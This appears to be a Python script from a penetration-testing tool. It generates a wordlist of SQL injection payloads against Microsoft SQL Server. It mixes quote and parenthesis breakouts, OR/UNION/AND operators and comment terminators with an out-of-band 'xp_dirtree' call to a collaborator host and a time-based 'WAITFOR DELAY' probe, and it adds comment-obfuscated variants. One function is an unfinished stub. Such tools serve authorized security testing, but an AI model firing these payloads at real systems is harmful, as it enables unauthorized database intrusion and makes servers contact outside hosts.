prefixes = [
    '',
    '; ',
    '" ',
    '") ',
    '")) ',
    '"))) ',
    ') ',
    ')) ',
    '))) '
]

sqlOperators = [
    '',
    'OR ',
    'UNION ',
    'AND '
]

suffixes = [
    '',
    '--',
    '/*'
    # ' ("',
    # ' (("',
    # ' ((("',
    # ' (',
    # ' ((',
    # ' ((('
]

templates = [
    'exec master..xp_dirtree "//{collaborator}/a"',
    'WAITFOR DELAY "0:0:{time}"'
]

concats = [
    ['"+', '+"'],
    ['"+(', ')+"'],
    ['+ ', ''],
    ['+(', ')']
]

# injection via concatinations TODO!
def generate_quick():
    wordlist = []
    for concat in concats:
        for template in templates:
            pass
    wordlist = list(set(wordlist))
    return wordlist

# injection via operators + concatinations
def generate():
    wordlist = []
    for prefix in prefixes:
        for sqlOperator in sqlOperators:
            for template in templates:
                for suffix in suffixes:
                    word = prefix + sqlOperator + template + suffix
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))
                    word = word.replace(' ', '/**/')
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))

    wordlist = list(set(wordlist))
    return wordlist
